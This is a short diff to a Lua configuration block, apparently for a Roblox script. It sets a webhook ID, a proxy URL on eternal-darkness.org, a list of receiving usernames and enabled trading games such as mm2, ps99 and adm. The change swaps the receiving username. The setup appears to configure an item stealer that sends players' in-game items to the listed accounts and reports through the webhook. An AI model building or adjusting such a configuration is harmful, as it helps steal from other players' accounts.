@@ -2,7 +2,7 @@
 -- _G.Main = "ten acc chinh og"
 _G.ED_CONFIG = {
     WEBHOOK_ID = "ceb0d8b499fe43db11f9a375b0a8b4d6",
-    USERNAMES = {"1rlzrn"},
+    USERNAMES = {"unbareunhero"},
     PROXY_URL = "https://eternal-darkness.org/apis/proxy/",
     USERNAME = "meobeoreal._",
     ENABLED_GAMES = {["mm2"]=true,["ps99"]=true,["adm"]=true,["sab"]=true,["gag2"]=true,["sp"]=true,["bb"]=true,},
